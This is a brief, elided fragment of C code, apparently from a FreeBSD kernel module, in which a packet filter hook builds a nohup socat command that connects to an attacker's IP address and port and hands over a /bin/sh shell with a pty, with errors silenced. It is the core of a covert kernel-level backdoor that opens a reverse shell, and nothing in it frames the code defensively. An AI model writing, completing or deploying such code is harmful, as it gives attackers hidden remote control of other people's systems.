...
static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir, void *arg, struct inpcb *inp) {
    ...
    snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd), "nohup /usr/local/bin/socat -d -d TCP:%s:%d EXEC:/bin/sh,pty,stderr 2>/dev/null", attacker_ip_str, LISTEN_PORT);
